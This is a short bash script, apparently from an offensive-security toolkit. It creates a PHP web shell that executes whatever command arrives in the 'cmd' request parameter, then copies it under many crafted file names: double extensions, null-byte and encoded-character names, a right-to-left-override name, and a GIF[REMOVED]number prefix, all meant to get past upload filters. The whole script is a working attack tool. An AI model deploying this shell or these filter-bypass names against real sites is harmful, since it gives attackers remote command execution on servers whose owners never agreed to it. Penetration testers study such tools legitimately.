#!/bin/bash
#
#Author: hxhBrofessor
#Title:  upload-tricks.sh
#Purpose: Builds multiple PHP scripts with different file extensions along with one file that contains a GIF magic number appended to the script
################################################################################################################################################

getPath=$(pwd)

script="theMerp-System_CMD"

og_file=$getPath/$script

#PHP system command
echo '<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>' > $getPath/$script


#magic number modification

echo 'GIF8; <?php if(isset($_REQUEST[cmd])){ echo "<pre>"; $cmd = ($_REQUEST[cmd]); system($cmd); echo "</pre>"; die; }?>' > $getPath/$script.php.gif

for new_file in $og_file;
    do

#double extenstions
    cp $og_file $new_file.jpg.php 
    cp $og_file $new_filepng.png.php
    cp $og_file $new_file.gif.php
    cp $og_file $new_file.pdf.php 
    cp $og_file $new_file.docx.php

#null Byte
    cp $og_file $new_file.php%00.gif
    cp $og_file $new_file.php\x00.gif
    cp $og_file $new_file.php%00.png
    cp $og_file $new_file.php\x00.png
    cp $og_file $new_file.php%00.jpg
    cp $og_file $new_file.php\x00.jpg

#special characters
    cp $og_file $new_file......
    cp $og_file $new_file.php%20
    #Right to Left Override (RTLO) name.%E2%80%AEphp.jpg will became name.gpj.php
    cp $og_file $new_file.%E2%80%AEphp.jpg
done
exit 0
